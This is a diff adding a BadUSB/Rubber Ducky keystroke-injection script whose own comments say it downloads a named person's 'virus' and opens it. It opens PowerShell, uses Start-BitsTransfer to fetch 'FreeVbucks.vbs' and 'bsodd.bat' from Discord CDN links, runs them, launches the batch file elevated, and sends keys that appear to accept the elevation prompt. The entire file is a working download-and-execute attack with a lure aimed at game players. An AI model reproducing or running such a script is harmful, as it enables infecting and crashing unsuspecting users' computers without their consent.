@@ -1,0 +1,45 @@
+REM made by Levi Merrick
+REM this script downloads @lach#4305's virus and opens it
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+STRING cd C:\
+DELAY 1000
+ENTER
+DELAY 1000
+STRING Start-BitsTransfer 'https://cdn.discordapp.com/attachments/1065798566674702370/1066189507117989908/FreeVbucks.vbs'
+DELAY 1000
+ENTER
+DELAY 10000
+STRING START-PROCESS "C:\FreeVbucks"
+DELAY 500
+ENTER
+DELAY 20000
+REM made by Lachlan 
+REM this script downloads @lach#4305's virus and opens it
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING cd C:\
+DELAY 1000
+ENTER
+DELAY 1000
+STRING Start-BitsTransfer 'https://cdn.discordapp.com/attachments/1065798566674702370/1065798594227077250/bsodd.bat'
+DELAY 1000
+ENTER
+DELAY 10000
+STRING START-PROCESS "C:\bsodd.bat" -Verb runAs
+DELAY 500
+ENTER
+DELAY 3000
+LEFTARROW
+DELAY 500
+ENTER
